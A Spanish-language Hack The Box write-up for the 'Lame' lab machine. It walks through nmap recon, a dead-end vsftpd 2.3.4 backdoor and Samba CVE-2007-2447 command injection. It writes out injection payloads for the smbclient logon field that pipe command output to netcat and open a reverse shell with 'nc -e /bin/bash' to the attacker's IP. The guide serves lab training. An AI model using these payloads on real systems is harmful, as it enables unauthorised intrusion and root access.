---
layout: single
title: Lame: Hack The Box
excerpt: "Gracias a la versión de Samba 3.0.20, sera vulnerable a una ejecución remota de comandos (RCE) sin autenticarnos debido a que el username map script como en otros scripts definidos en smb.conf, se pasan datos no filtrados de usuario a /bin/sh. En el caso del username map script, esto puede ocurrir sin necesidad de autenticación."
date: 2025-10-12
classes: wide
header:
  teaser: /assets/images/htb-writeup-lame/logo_lame.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hackthebox
  - Pentesting
  - eJPTv2
tags:
  - writeup
  - eJPTv2
  - smb
  - CVE-2007-2447
  - USERNAME-MAP-SCRIPT-RCE
  - ReverseShell
---

## WRITE UP
IP VÍCTIMA: 10.10.10.3 (víctima) TTL=  63 LINUX

### RECONOCIMIENTO

Lo primero que vamos hacer es crear nuestro entorno de trabajo: <span style="color:lightblue">Lame</span>

Dentro usaremos la herramienta de s4vitar *mkt* cual nos generara las carpetas necesarias para tener todo más organizado; **Nmap...**

Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:red">IP</span> de la maquina víctima, para comprobar que tenemos conectividad, tenemos dos alternativas:

-Usar el script *whichSystem* que nos dirá directamente el equipo al que estamos atacando, por ende habrá tenido ping para dar la respuesta. Es más silencioso que nmap.

```bash
whichSystem.py 10.10.10.3
```

-Usar el comando *ping*: 

```bash
ping 10.10.10.3 -c1 -R
# -R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición, al ser Windows no lo muestra.*
```

Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que puertos tenemos abiertos y que protocolos/servicios tenemos.

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.3 -oG allPorts
# Veremos porque el formato grepeable, es importante.
```

Una vez hecho, usaremos otra herramienta de s4vitar *extractports* al archivo allPorts
cual nos copiara los puertos, y escanearlos con nmap. 

```bash
extractports.sh allPorts
```

```bash
nmap -sVC -p21,22,139,445,3632 10.10.10.3 -oN targeted
#  El formato -oN lo emplearemos con batcat lenguaje java para verlo mejor
#  Nos mostrará la versión de los servicios que están corriendo
#  Usará scripts defaults definidos en lua
```

Una vez escaneado, usaremos batcat:
>https://github.com/sharkdp/bat.git

```bash
batcat targeted -l java
# Nos mostrara la salida en un formato más bonito, con java*
```

### ANÁLISIS FTP: RECONOCIMIENTO

En el escaneo de nmap vemos que nos ha sacado que hay un login. con <span style="color:blue">anonymous</span>.

Ahora listaremos los scripts que se han usado en el puerto 21.

```bash
locate ftp | grep ".nse"
```

**ftp**-<span style="color:red">anon.nse</span>

Vamos a mirar si hay algún contenido en el FTP entonces:

```bash
ftp 10.10.10.3 
-> Name anonymous
-> Password (pass_en_blanco)
```

No habrá nada, archivos ni directorios.

### VULNERAVILIDAD V2.3.3: )

```bash
searchsploit vsftpd 2.3.4
```

Miramos el código del exploit: 

```bash
searchsploit -x /unix/remote/49757.py | batcat -l python
```

Como vemos usa un usuario con la **:)** cuando se conecta por netcat por el puerto 21 y la IP víctima, pone dichas credenciales y si funciona, se abre el puerto 6200 por donde recibe una shell.

Tiene la versión de <span style="color:orange">vsftpd 2.3.4</span> cual es vulnerable.

Esta vulnerabilidad es más fácil que el anterior método, ya que en la versión <span style="color:DarkOrange">vsftpd 2.3.4</span> si ponemos "algo:)" de usuario nos abrirá un <span style="color:purple">puerto 6200</span> cual nos permitirá obtener una shell con privilegios (<span style="color:blue">root</span>). 

Esto es debido porque alguien entro a los repositorios oficiales y modifico el código fuente para que si colocas en el login un **:)** este se enlace a una sh con privilegios (<span style="color:blue">root</span>).

```bash
ftp 10.10.10.3
-> Name root:) 
-> Passowrd (contraseña_en_blanco)
```

```bash
nc 10.10.10.3 21
-> USER root:)
-> PASS (contraseña_en_blanco)
```

Esto no es por aquí, es un **rabbit hole**.

### ANÁLISIS SMB: RECONOCIMIENTO

### RESOLUCIÓN NOMBRES LOCAL
Agregamos en <span style="color:lightblue">/etc/</span><span style="color:grey">hosts</span> el **nombre del ordenador(loca)**, **FQDN** y **Dominio**. Para evitar problemas y así tener más compatibilidad en cuanto a usar el dominio en vez de la IP.

Por otro lado...
*searchsploit* **samba 3.0.2** 

Nos quedaremos con el primer exploit cual es una ejecución de comandos.

```bash
searchsploit samba 3.0.2
```

### ANÁLISIS CÓDIGO
Miramos el código del exploit:

```bash
searchsploit -x /unix/remote/16320.rb | batcat -l ruby
```

Nos dice que cuando nos conectemos a un share mediante el campo nombre podemos inyectar un código malicioso cual nos va a permitir ejecución de comandos.

```"/= `nohup comando`"```

Con *netexec* podremos solicitar info del sistema y listar shares con <span style="color:blue">null sesión</span>.

```bash
# Listamos información del sistema como NULL Session.
netexec smb hackthebox.gr -u "" -p ""

# Listamos shares como NULL Session.
netexec smb hackthebox.gr -u "" -p "" --shares
```

Entraremos al <span style="color:lightblue">share tmp</span> ya que es al único que nos deja como <span style="color:blue">null sesión</span>.

```bash
smbclient \\\\10.10.10.3\\tmp
-> Name (Nombre_en_blanco)
-> Password (Contraseña_en_blanco)
```

### USERNAME MAP SCRIPT: RCE

>Información acerca **CVE-2007-2447**:
> [Incibe CVE-2007-2447](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2007-2447)

Dentro con **?** listamos los comandos.

``?``

Como estamos sin un usuario autenticado usaremos **logon** para usar el payload malicioso.
En el campo username pondremos:

>```"/= `nohup comando`"```

Sintaxis para comprobar que funciona mediante una traza ICMP hacia nosotros desde la máquina victima:

```logon  "/= `nohup ping 10.10.16.10 -c1`"```

Nos enviaremos un **ping** a nuestra máquina.

Con *tcpdump* nos pondremos escucha para comprobar que recibimos la traza ICMP, y efectivamente la recibimos.

```bash
sudo tcpdump -l -i tun0 icmp
```

Nos ponemos en escucha por el <span style="color:purple">puerto 444</span> para cuando establezcamos la *reverse shell*, recibir la conexión a nuestro host, de momento para ver la salida de algunos comandos.

```bash
nc -nvlp 444
```

Enviaremos un **whoami** para saber quien esta ejecutando los comandos.

```logon  "/= `nohup whoami | nc 10.10.16.10 444`"```

Recibimos a nuestro **netcat** orden del comando, estamos ejecutando comandos como <span style="color:blue">root</span>.

### REVERSE SHELL

Ahora si preparamos netcat para revershell:

```bash
nc -nvlp 444
```

```logon  "/= `nohup nc -e /bin/bash 10.10.16.10 444`"```

Por el otro lado recibiremos la conexión a nuestro nc en escucha.

```bash
# Comprobar nuestro usuario actual.
id

# Comprobar los párametros de red de la máquina actual.
ip a
```

### SHELL INTERACTIVA: TRATAMIENTO TTY

1) ```script /dev/null -c bash```

2) ```CTRL + Z```

3) ```stty raw -echo; fg```

4) ```reset  xterm``` (no esta bien la imagen)

5) ```export TERM=xterm```

Ya tendremos una  Shell totalmente interactiva !!

### BANDERA USUARIO

Nos vamos al home del usuario <span style="color:blue">makis </span>-> <span style="color:lightblue">makis/</span> y cogemos la bandera.

### BANDERA ROOT

Nos vamos al directorio <span style="color:blue">root </span>-> <span style="color:lightblue">root/</span> y cogemos la bandera.

